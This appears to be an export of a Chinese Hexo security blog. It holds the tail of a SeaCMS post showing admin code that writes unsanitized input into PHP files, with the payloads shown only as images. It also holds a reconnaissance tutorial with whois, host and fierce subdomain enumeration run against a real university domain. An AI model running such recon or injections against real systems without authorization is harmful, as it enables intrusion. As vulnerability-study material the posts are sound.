<span class="variable">$str</span>.=<span class="string">&quot;<span class="variable">$msg4b</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$str</span>.=<span class="string">&#x27;&quot;); &#x27;</span>;</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="variable">$str</span>.=<span class="string">&#x27;define(&quot;msg5a&quot;, &quot;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$str</span>.=<span class="string">&quot;<span class="variable">$msg5a</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$str</span>.=<span class="string">&#x27;&quot;); &#x27;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$str</span>.=<span class="string">&#x27;define(&quot;msg5b&quot;, &quot;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$str</span>.=<span class="string">&quot;<span class="variable">$msg5b</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$str</span>.=<span class="string">&#x27;&quot;); &#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="variable">$str</span>.=<span class="string">&quot; ?&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">	fwrite(<span class="variable">$open</span>,<span class="variable">$str</span>);</span><br><span class="line"></span><br><span class="line">	fclose(<span class="variable">$open</span>);</span><br><span class="line"></span><br><span class="line">	ShowMsg(<span class="string">&quot;成功保存设置!&quot;</span>,<span class="string">&quot;admin_weixin.php&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">exit</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在fwrite处写入文件 构造payload</p>
<p><img src="/images/fx/Seacms/1.png" alt="direct"></p>
<p>访问 /data/admin/weixin.php<br>回显为phpinfo界面</p>
<p><img src="/images/fx/Seacms/2.png" alt="direct"></p>
<h2 id="后台命令执行（三）"><a href="#后台命令执行（三）" class="headerlink" title="后台命令执行（三）"></a>后台命令执行（三）</h2><p>在pjsxwk/admin_notify.php第五行对传入的数据没有进行处理，直接拼接字符串之后写入文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$action</span>==<span class="string">&quot;set&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="variable">$notify1</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;notify1&#x27;</span>];</span><br><span class="line">	<span class="variable">$notify2</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;notify2&#x27;</span>];</span><br><span class="line">	<span class="variable">$notify3</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;notify3&#x27;</span>];</span><br><span class="line">	<span class="variable">$open</span>=fopen(<span class="string">&quot;../data/admin/notify.php&quot;</span>,<span class="string">&quot;w&quot;</span> );</span><br><span class="line">	<span class="variable">$str</span>=<span class="string">&#x27;&lt;?php &#x27;</span>;</span><br><span class="line">	<span class="variable">$str</span>.=<span class="string">&#x27;$notify1 = &quot;&#x27;</span>;</span><br><span class="line">	<span class="variable">$str</span>.=<span class="string">&quot;<span class="variable">$notify1</span>&quot;</span>;</span><br><span class="line">	<span class="variable">$str</span>.=<span class="string">&#x27;&quot;; &#x27;</span>;</span><br><span class="line">	<span class="variable">$str</span>.=<span class="string">&#x27;$notify2 = &quot;&#x27;</span>;</span><br><span class="line">	<span class="variable">$str</span>.=<span class="string">&quot;<span class="variable">$notify2</span>&quot;</span>;</span><br><span class="line">	<span class="variable">$str</span>.=<span class="string">&#x27;&quot;; &#x27;</span>;</span><br><span class="line">	<span class="variable">$str</span>.=<span class="string">&#x27;$notify3 = &quot;&#x27;</span>;</span><br><span class="line">	<span class="variable">$str</span>.=<span class="string">&quot;<span class="variable">$notify3</span>&quot;</span>;</span><br><span class="line">	<span class="variable">$str</span>.=<span class="string">&#x27;&quot;; &#x27;</span>;</span><br><span class="line">	<span class="variable">$str</span>.=<span class="string">&quot; ?&gt;&quot;</span>;</span><br><span class="line">	fwrite(<span class="variable">$open</span>,<span class="variable">$str</span>);</span><br><span class="line">	fclose(<span class="variable">$open</span>);</span><br><span class="line">	ShowMsg(<span class="string">&quot;成功保存设置!&quot;</span>,<span class="string">&quot;admin_notify.php&quot;</span>);</span><br><span class="line">	<span class="built_in">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>构造payload</p>
<p><img src="/images/fx/Seacms/5.png" alt="direct"></p>
<p>访问/data/admin/notify.php</p>
<p><img src="/images/fx/Seacms/6.png" alt="direct"></p>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>网站漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2020/09/20/hello-world/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>我的第一篇博客</title>
    <url>/2020/09/21/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>这是我使用hexo搭的第一篇博客，今天是2020年9月21日</p>
<h2 id="First"><a href="#First" class="headerlink" title="First"></a>First</h2>
    <div id="aplayer-xEPjQlBR" class="aplayer aplayer-tag-marker meting-tag-marker" data-id="355995" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#ad7a86"></div>
<h3 id="I-want-to-say-but-there-is-nothing-to-say"><a href="#I-want-to-say-but-there-is-nothing-to-say" class="headerlink" title="I want to say , but there is nothing to say"></a>I want to say , but there is nothing to say</h3><p>植根于内心的修养，无需提醒的自觉，以约束为前提的自由，为他人着想的善良 –梁晓声曾这样概括文化二字<br><img src="/images/nanfei.jpg" alt="direct"></p>
]]></content>
      <categories>
        <category>随笔</category>
      </categories>
  </entry>
  <entry>
    <title>渗透信息收集</title>
    <url>/2020/11/12/%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>收集渗透目标的情报是最重要的阶段。如果收集到有用的情报资料的话，可以大大提高对渗透测试的成功性。收集渗透目标的情报一般是对目标系统的分析，扫描探测，服务查点，扫描对方漏洞，查找对方系统IP等，有时候渗透测试者也会用上“社会工程学”。渗透测试者会尽力搜集目标系统的配置与安全防御以及防火墙等等。</p>
<h2 id="信息收集的方法"><a href="#信息收集的方法" class="headerlink" title="信息收集的方法"></a>信息收集的方法</h2><p>1.主动式收集:主动式收集是通过直接发起与被测目标网络之间的互动来获取相关信息,例如,ICMP ping或者TCP端口扫描。</p>
<p>2.被动式收集:被动式收集则是通过第三方服务来获取目标网络的相关信息,例如使用谷歌搜索引擎等。</p>
<p>一般来说收集的信息越多越好，通常包括以下几个部分：</p>
<p>域名信息收集</p>
<p>子域名信息收集</p>
<p>站点信息收集</p>
<p>敏感信息收集</p>
<p>服务器信息收集</p>
<p>端口信息收集</p>
<p>真实IP地址识别</p>
<p>社会工程学</p>
<h2 id="网站及服务器信息"><a href="#网站及服务器信息" class="headerlink" title="网站及服务器信息"></a>网站及服务器信息</h2><h3 id="域名信息收集"><a href="#域名信息收集" class="headerlink" title="域名信息收集"></a>域名信息收集</h3><p>whios是个标准的互联网协议,可用于收集网络注册,注册域名,IP地址和自治系统的信息,whios数据库记录有该域名的DNS服务器信息和注册人的联系信息。whois是用来查询域名的IP以及所有者等信息的传输协议。简单说，whois就是一个用来查询域名是否已经被注册，以及注册域名的详细信息的数据库（如域名所有人、域名注册商）。在whois查询中，注册人姓名和邮箱信息，通常对于测试个人站点非常有用，因为我们可以通过搜索引擎，社交网络，挖掘出很多域名所有人的信息。而对于小站点而言，域名所有人往往就是管理员。</p>
<p>==示例==</p>
<p>默认安装的kali中带有whois的客户端,如需查询某一域名的whois信息,可在终端中使用下述whois命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:/home/toor/桌面<span class="comment"># whois baidu.com</span></span><br><span class="line">   Domain Name: BAIDU.COM</span><br><span class="line">   Registry Domain ID: 11181110_DOMAIN_COM-VRSN</span><br><span class="line">   Registrar WHOIS Server: whois.markmonitor.com</span><br><span class="line">   Registrar URL: http://www.markmonitor.com</span><br><span class="line">   Updated Date: 2019-05-09T04:30:46Z</span><br><span class="line">   Creation Date: 1999-10-11T11:05:17Z</span><br><span class="line">   Registry Expiry Date: 2026-10-11T11:05:17Z</span><br><span class="line">   Registrar: MarkMonitor Inc.</span><br><span class="line">   Registrar IANA ID: 292</span><br><span class="line">   Registrar Abuse Contact Email: abusecomplaints@markmonitor.com</span><br><span class="line">   Registrar Abuse Contact Phone: +1.2083895740</span><br><span class="line">   Domain Status: clientDeleteProhibited https://icann.org/epp<span class="comment">#clientDeleteProhibited</span></span><br><span class="line">   Domain Status: clientTransferProhibited https://icann.org/epp<span class="comment">#clientTransferProhibited</span></span><br><span class="line">   Domain Status: clientUpdateProhibited https://icann.org/epp<span class="comment">#clientUpdateProhibited</span></span><br><span class="line">   Domain Status: serverDeleteProhibited https://icann.org/epp<span class="comment">#serverDeleteProhibited</span></span><br><span class="line">   Domain Status: serverTransferProhibited https://icann.org/epp<span class="comment">#serverTransferProhibited</span></span><br><span class="line">   Domain Status: serverUpdateProhibited https://icann.org/epp<span class="comment">#serverUpdateProhibited</span></span><br><span class="line">   Name Server: NS1.BAIDU.COM</span><br><span class="line">   Name Server: NS2.BAIDU.COM</span><br><span class="line">   Name Server: NS3.BAIDU.COM</span><br><span class="line">   Name Server: NS4.BAIDU.COM</span><br><span class="line">   Name Server: NS7.BAIDU.COM</span><br><span class="line">   DNSSEC: unsigned</span><br><span class="line">   URL of the ICANN Whois Inaccuracy Complaint Form: https://www.icann.org/wicf/</span><br><span class="line">&gt;&gt;&gt; Last update of whois database: 2020-11-11T11:00:32Z &lt;&lt;&lt;</span><br><span class="line"></span><br><span class="line">For more information on Whois status codes, please visit https://icann.org/epp</span><br><span class="line"></span><br><span class="line">NOTICE: The expiration date displayed <span class="keyword">in</span> this record is the date the</span><br><span class="line">registrar<span class="string">&#x27;s sponsorship of the domain name registration in the registry is</span></span><br><span class="line"><span class="string">currently set to expire. This date does not necessarily reflect the expiration</span></span><br><span class="line"><span class="string">date of the domain name registrant&#x27;</span>s agreement with the sponsoring</span><br><span class="line">registrar.  Users may consult the sponsoring registrar<span class="string">&#x27;s Whois database to</span></span><br><span class="line"><span class="string">view the registrar&#x27;</span>s reported date of expiration <span class="keyword">for</span> this registration.</span><br><span class="line"></span><br><span class="line">TERMS OF USE: You are not authorized to access or query our Whois</span><br><span class="line">database through the use of electronic processes that are high-volume and</span><br><span class="line">automated except as reasonably necessary to register domain names or</span><br><span class="line">modify existing registrations; the Data <span class="keyword">in</span> VeriSign Global Registry</span><br><span class="line">Services<span class="string">&#x27; (&quot;VeriSign&quot;) Whois database is provided by VeriSign for</span></span><br><span class="line"><span class="string">information purposes only, and to assist persons in obtaining information</span></span><br><span class="line"><span class="string">about or related to a domain name registration record. VeriSign does not</span></span><br><span class="line"><span class="string">guarantee its accuracy. By submitting a Whois query, you agree to abide</span></span><br><span class="line"><span class="string">by the following terms of use: You agree that you may use this Data only</span></span><br><span class="line"><span class="string">for lawful purposes and that under no circumstances will you use this Data</span></span><br><span class="line"><span class="string">to: (1) allow, enable, or otherwise support the transmission of mass</span></span><br><span class="line"><span class="string">unsolicited, commercial advertising or solicitations via e-mail, telephone,</span></span><br><span class="line"><span class="string">or facsimile; or (2) enable high volume, automated, electronic processes</span></span><br><span class="line"><span class="string">that apply to VeriSign (or its computer systems). The compilation,</span></span><br><span class="line"><span class="string">repackaging, dissemination or other use of this Data is expressly</span></span><br><span class="line"><span class="string">prohibited without the prior written consent of VeriSign. You agree not to</span></span><br><span class="line"><span class="string">use electronic processes that are automated and high-volume to access or</span></span><br><span class="line"><span class="string">query the Whois database except as reasonably necessary to register</span></span><br><span class="line"><span class="string">domain names or modify existing registrations. VeriSign reserves the right</span></span><br><span class="line"><span class="string">to restrict your access to the Whois database in its sole discretion to ensure</span></span><br><span class="line"><span class="string">operational stability.  VeriSign may restrict or terminate your access to the</span></span><br><span class="line"><span class="string">Whois database for failure to abide by these terms of use. VeriSign</span></span><br><span class="line"><span class="string">reserves the right to modify these terms at any time.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The Registry database contains ONLY .COM, .NET, .EDU domains and</span></span><br><span class="line"><span class="string">Registrars.</span></span><br><span class="line"><span class="string">Domain Name: baidu.com</span></span><br><span class="line"><span class="string">Registry Domain ID: 11181110_DOMAIN_COM-VRSN</span></span><br><span class="line"><span class="string">Registrar WHOIS Server: whois.markmonitor.com</span></span><br><span class="line"><span class="string">Registrar URL: http://www.markmonitor.com</span></span><br><span class="line"><span class="string">Updated Date: 2019-05-08T20:59:33-0700</span></span><br><span class="line"><span class="string">Creation Date: 1999-10-11T04:05:17-0700</span></span><br><span class="line"><span class="string">Registrar Registration Expiration Date: 2026-10-11T00:00:00-0700</span></span><br><span class="line"><span class="string">Registrar: MarkMonitor, Inc.</span></span><br><span class="line"><span class="string">Registrar IANA ID: 292</span></span><br><span class="line"><span class="string">Registrar Abuse Contact Email: abusecomplaints@markmonitor.com</span></span><br><span class="line"><span class="string">Registrar Abuse Contact Phone: +1.2083895770</span></span><br><span class="line"><span class="string">Domain Status: clientUpdateProhibited (https://www.icann.org/epp#clientUpdateProhibited)</span></span><br><span class="line"><span class="string">Domain Status: clientTransferProhibited (https://www.icann.org/epp#clientTransferProhibited)</span></span><br><span class="line"><span class="string">Domain Status: clientDeleteProhibited (https://www.icann.org/epp#clientDeleteProhibited)</span></span><br><span class="line"><span class="string">Domain Status: serverUpdateProhibited (https://www.icann.org/epp#serverUpdateProhibited)</span></span><br><span class="line"><span class="string">Domain Status: serverTransferProhibited (https://www.icann.org/epp#serverTransferProhibited)</span></span><br><span class="line"><span class="string">Domain Status: serverDeleteProhibited (https://www.icann.org/epp#serverDeleteProhibited)</span></span><br><span class="line"><span class="string">Registrant Organization: Beijing Baidu Netcom Science Technology Co., Ltd.</span></span><br><span class="line"><span class="string">Registrant State/Province: Beijing</span></span><br><span class="line"><span class="string">Registrant Country: CN</span></span><br><span class="line"><span class="string">Registrant Email: Select Request Email Form at https://domains.markmonitor.com/whois/baidu.com</span></span><br><span class="line"><span class="string">Admin Organization: Beijing Baidu Netcom Science Technology Co., Ltd.</span></span><br><span class="line"><span class="string">Admin State/Province: Beijing</span></span><br><span class="line"><span class="string">Admin Country: CN</span></span><br><span class="line"><span class="string">Admin Email: Select Request Email Form at https://domains.markmonitor.com/whois/baidu.com</span></span><br><span class="line"><span class="string">Tech Organization: Beijing Baidu Netcom Science Technology Co., Ltd.</span></span><br><span class="line"><span class="string">Tech State/Province: Beijing</span></span><br><span class="line"><span class="string">Tech Country: CN</span></span><br><span class="line"><span class="string">Tech Email: Select Request Email Form at https://domains.markmonitor.com/whois/baidu.com</span></span><br><span class="line"><span class="string">Name Server: ns1.baidu.com</span></span><br><span class="line"><span class="string">Name Server: ns7.baidu.com</span></span><br><span class="line"><span class="string">Name Server: ns3.baidu.com</span></span><br><span class="line"><span class="string">Name Server: ns2.baidu.com</span></span><br><span class="line"><span class="string">Name Server: ns4.baidu.com</span></span><br><span class="line"><span class="string">DNSSEC: unsigned</span></span><br><span class="line"><span class="string">URL of the ICANN WHOIS Data Problem Reporting System: http://wdprs.internic.net/</span></span><br><span class="line"><span class="string">&gt;&gt;&gt; Last update of WHOIS database: 2020-11-11T02:55:07-0800 &lt;&lt;&lt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">For more information on WHOIS status codes, please visit:</span></span><br><span class="line"><span class="string">  https://www.icann.org/resources/pages/epp-status-codes</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">If you wish to contact this domain’s Registrant, Administrative, or Technical</span></span><br><span class="line"><span class="string">contact, and such email address is not visible above, you may do so via our web</span></span><br><span class="line"><span class="string">form, pursuant to ICANN’s Temporary Specification. To verify that you are not a</span></span><br><span class="line"><span class="string">robot, please enter your email address to receive a link to a page that</span></span><br><span class="line"><span class="string">facilitates email communication with the relevant contact(s).</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Web-based WHOIS:</span></span><br><span class="line"><span class="string">  https://domains.markmonitor.com/whois</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">If you have a legitimate interest in viewing the non-public WHOIS details, send</span></span><br><span class="line"><span class="string">your request and the reasons for your request to whoisrequest@markmonitor.com</span></span><br><span class="line"><span class="string">and specify the domain name in the subject line. We will review that request and</span></span><br><span class="line"><span class="string">may ask for supporting documentation and explanation.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The data in MarkMonitor’s WHOIS database is provided for information purposes,</span></span><br><span class="line"><span class="string">and to assist persons in obtaining information about or related to a domain</span></span><br><span class="line"><span class="string">name’s registration record. While MarkMonitor believes the data to be accurate,</span></span><br><span class="line"><span class="string">the data is provided &quot;as is&quot; with no guarantee or warranties regarding its</span></span><br><span class="line"><span class="string">accuracy.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">By submitting a WHOIS query, you agree that you will use this data only for</span></span><br><span class="line"><span class="string">lawful purposes and that, under no circumstances will you use this data to:</span></span><br><span class="line"><span class="string">  (1) allow, enable, or otherwise support the transmission by email, telephone,</span></span><br><span class="line"><span class="string">or facsimile of mass, unsolicited, commercial advertising, or spam; or</span></span><br><span class="line"><span class="string">  (2) enable high volume, automated, or electronic processes that send queries,</span></span><br><span class="line"><span class="string">data, or email to MarkMonitor (or its systems) or the domain name contacts (or</span></span><br><span class="line"><span class="string">its systems).</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">MarkMonitor reserves the right to modify these terms at any time.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">By submitting this query, you agree to abide by this policy.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">MarkMonitor Domain Management(TM)</span></span><br><span class="line"><span class="string">Protecting companies and consumers in a digital world.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Visit MarkMonitor at https://www.markmonitor.com</span></span><br><span class="line"><span class="string">Contact us at +1.8007459229</span></span><br><span class="line"><span class="string">In Europe, at +44.02032062220</span></span><br><span class="line"><span class="string">--</span></span><br><span class="line"><span class="string">root@kali:/home/toor/桌面# </span></span><br></pre></td></tr></table></figure>
<p>可以从这返回的结果中获取DNS服务器的信息以及域名的注册人的联系方式,这些信息会在渗透测试的后续阶段发挥作用,当然也可以通过一些在线的工具进行查询:</p>
<p>站长之家: <a href="http://whois.chinaz.com/">http://whois.chinaz.com/</a></p>
<p>全球WHOIS查询:<a href="https://www.whois365.com/cn/">https://www.whois365.com/cn/</a></p>
<p>爱站:<a href="http://www.aizhan.com/">http://www.aizhan.com/</a></p>
<p>阿里云:<a href="https://whois.aliyun.com/whois/domain/">https://whois.aliyun.com/whois/domain/</a></p>
<p>Whois站长之家查询：<a href="http://whois.chinaz.com/">http://whois.chinaz.com/</a></p>
<p>阿里云中国万网查询：<a href="https://whois.aliyun.com/">https://whois.aliyun.com/</a></p>
<p>Whois Lookup 查找目标网站所有者的信息：<a href="http://whois.domaintools.com/">http://whois.domaintools.com/</a></p>
<p>Netcraft Site Report 显示目标网站上使用的技术：<a href="http://toolbar.netcraft.com/site_report?url=">http://toolbar.netcraft.com/site_report?url=</a></p>
<p>Robtex DNS 查询显示关于目标网站的全面的DNS信息：<a href="https://www.robtex.com/">https://www.robtex.com/</a></p>
<p>全球Whois查询：<a href="https://www.whois365.com/cn/">https://www.whois365.com/cn/</a></p>
<p>站长工具爱站查询：<a href="https://whois.aizhan.com/">https://whois.aizhan.com/</a></p>
<h3 id="备案信息查询"><a href="#备案信息查询" class="headerlink" title="备案信息查询"></a>备案信息查询</h3><p>网站备案信息是根据国家法律法规规定，由网站所有者向国家有关部门申请的备案，是国家信息产业部对网站的一种管理途径，是为了防止在网上从事非法网站经营活动，当然主要是针对国内网站。</p>
<p>在备案查询中我们主要关注的是：单位信息例如名称、备案编号、网站负责人、法人、电子邮箱、联系电话等。</p>
<p>常用的备案信息查询网站有以下几个：</p>
<p>ICP/IP地址/域名信息备案管理系统：<a href="http://beian.miit.gov.cn/publish/query/indexFirst.action">http://beian.miit.gov.cn/publish/query/indexFirst.action</a></p>
<p>ICP备案查询网：<a href="http://www.beianbeian.com/">http://www.beianbeian.com/</a></p>
<p>备案吧吧：<a href="https://www.beian88.com/">https://www.beian88.com/</a></p>
<p>天眼查：<a href="https://www.tianyancha.com/">https://www.tianyancha.com/</a></p>
<h3 id="DNS服务器查询"><a href="#DNS服务器查询" class="headerlink" title="DNS服务器查询"></a>DNS服务器查询</h3><p>通过host命令来查询dns服务器</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">host 命令</span><br><span class="line"></span><br><span class="line">-a：显示详细的DNS信息；</span><br><span class="line">-c&lt;类型&gt;：指定查询类型，默认值为“IN“；</span><br><span class="line">-C：查询指定主机的完整的SOA记录；</span><br><span class="line">-r：在查询域名时，不使用递归的查询方式；</span><br><span class="line">-t&lt;类型&gt;：指定查询的域名信息类型；</span><br><span class="line">-v：显示指令执行的详细信息；</span><br><span class="line">-w：如果域名服务器没有给出应答信息，则总是等待，直到域名服务器给出应答；</span><br><span class="line">-W&lt;时间&gt;：指定域名查询的最长时间，如果在指定时间内域名服务器没有给出应答信息，则退出指令；</span><br><span class="line">-4：使用IPv4；</span><br><span class="line">-6：使用IPv6.</span><br><span class="line"></span><br><span class="line">hostname [server]</span><br></pre></td></tr></table></figure>
<h4 id="查询域名服务器"><a href="#查询域名服务器" class="headerlink" title="查询域名服务器"></a>查询域名服务器</h4><p>==示例==</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:/home/toor/桌面<span class="comment"># host -t ns hdu.edu.cn</span></span><br><span class="line">hdu.edu.cn name server dns1.hdu.edu.cn.</span><br><span class="line">hdu.edu.cn name server dns2.hdu.edu.cn.</span><br><span class="line">hdu.edu.cn name server dns3.hdu.edu.cn.</span><br><span class="line">可以看到有3个dns服务器</span><br><span class="line">[root@localhost ~]<span class="comment"># host www.linuxde.net   </span></span><br><span class="line">www.linuxde.net is an <span class="built_in">alias</span> <span class="keyword">for</span> host.1.linuxde.net.</span><br><span class="line">host.1.linuxde.net has address 100.42.212.8</span><br></pre></td></tr></table></figure>
<p>DNS记录类型=&gt;在买了域名后IDC的那个后台里，添加解析记录的地方就能看到</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">A记录: A (Address)记录是用来指定主机名(或域名)对应的IP地址记录。户可以将该域名下的网站服务器指向到</span><br><span class="line">NS记录: NS (NameServer)记录是域名服务器记录，用来指定该域名由哪个DNS服务器来进行解析。</span><br><span class="line">MX记录: MX (MailExchanger)记录是邮件交换记录</span><br><span class="line">CNAME记录: CNAME (Canonical Name )别名记录</span><br><span class="line">TXT录: - 般指某个主机名或域名的说明</span><br><span class="line">TTL值: TTL (Time-To-Live)原理:TTL是IP协议包中的一个值</span><br><span class="line">PTR值: PTR是pointer的简写，将一个IP地址映射到对应的域名,也被称为指针记录，PTR记录是A记录的逆向记录，作用是把IP地址解析为域名。</span><br><span class="line">SRV记录：SRV记录是服务器资源记录的缩写</span><br></pre></td></tr></table></figure>
<p>==示例==</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:/home/toor/桌面<span class="comment"># host -t a hdu.edu.cn</span></span><br><span class="line">hdu.edu.cn has address 218.75.123.169</span><br><span class="line">root@kali:/home/toor/桌面<span class="comment"># host -t a ctf.hnp.edu.cn</span></span><br><span class="line">ctf.hnp.edu.cn has address 183.169.148.18</span><br></pre></td></tr></table></figure>

<h3 id="域名枚举"><a href="#域名枚举" class="headerlink" title="域名枚举"></a>域名枚举</h3><p>在得到主域名信息之后，如果能通过主域名得到所有子域名信息，再通过子域名查询其对应的主机IP，这样我们能得到一个较为完整的信息。</p>
<p>使用fierse工具，可以进行域名列表查询：fierce -dns domainName<br>==示例==</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:/home/toor/桌面<span class="comment"># fierce -dns hdu.edu.cn</span></span><br><span class="line">DNS Servers <span class="keyword">for</span> hdu.edu.cn:</span><br><span class="line">        dns2.hdu.edu.cn</span><br><span class="line">        dns3.hdu.edu.cn</span><br><span class="line">        dns1.hdu.edu.cn</span><br><span class="line"></span><br><span class="line">Trying zone transfer first...</span><br><span class="line">        Testing dns2.hdu.edu.cn</span><br><span class="line">                Request timed out or transfer not allowed.</span><br><span class="line">        Testing dns3.hdu.edu.cn</span><br><span class="line">                Request timed out or transfer not allowed.</span><br><span class="line">        Testing dns1.hdu.edu.cn</span><br><span class="line">                Request timed out or transfer not allowed.</span><br><span class="line"></span><br><span class="line">Unsuccessful <span class="keyword">in</span> zone transfer (it was worth a shot)</span><br><span class="line">Okay, trying the good old fashioned way... brute force</span><br><span class="line"></span><br><span class="line">Checking <span class="keyword">for</span> wildcard DNS...</span><br><span class="line">Nope. Good.</span><br><span class="line">Now performing 2280 <span class="built_in">test</span>(s)...</span><br><span class="line">210.32.32.182   accounting.hdu.edu.cn</span><br><span class="line">210.32.32.181   accounting.hdu.edu.cn</span><br><span class="line">210.32.32.182   ai.hdu.edu.cn</span><br><span class="line">210.32.32.181   ai.hdu.edu.cn</span><br><span class="line">192.168.100.56  app1.hdu.edu.cn</span><br><span class="line">192.168.2.253   auth.hdu.edu.cn</span><br><span class="line">210.32.32.181   auto.hdu.edu.cn</span><br><span class="line">210.32.32.182   auto.hdu.edu.cn</span><br><span class="line">210.32.32.182   bbs.hdu.edu.cn</span><br><span class="line">210.32.32.181   bbs.hdu.edu.cn</span><br><span class="line">210.32.32.182   cg.hdu.edu.cn</span><br><span class="line">210.32.32.181   cg.hdu.edu.cn</span><br><span class="line">192.168.101.142 chat.hdu.edu.cn</span><br><span class="line">210.32.32.182   cms.hdu.edu.cn</span><br></pre></td></tr></table></figure>
<p>除fierse之外，dnsdict6、dnsenum、dnsmap都可以进行域名枚举</p>
<h3 id="反向地址解析"><a href="#反向地址解析" class="headerlink" title="反向地址解析"></a>反向地址解析</h3><p>我们经常使用到得DNS服务器里面有两个区域，即“正向查找区域”和“反向查找区域”，正向查找区域就是我们通常所说的域名解析，反向查找区域即是这里所说的IP反向解析，它的作用就是通过查询IP地址的PTR记录来得到该IP地址指向的域名.</p>
<p>由于在域名系统中，一个IP地址可以对应多个域名，因此从IP出发去找域名，理论上应该遍历整个域名树，但这在Internet上是不现实的。为了完成逆向域名解析，系统提供一个特别域，该特别域称为逆向解析域in-addr.arpa。这样欲解析的IP地址就会被表达成一种像域名一样的可显示串形式，后缀以逆向解析域域名”in-addr.arpa”结尾。例如一个IP地址：222.211.233.244，其逆向域名表达方式为：244.233.221.222.in-addr.arpa</p>
<p>dig:使用dig进行反向解析的命令格式为：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dig -x ip @dnsserver <span class="comment">#用 dig 查看反向解析</span></span><br></pre></td></tr></table></figure>
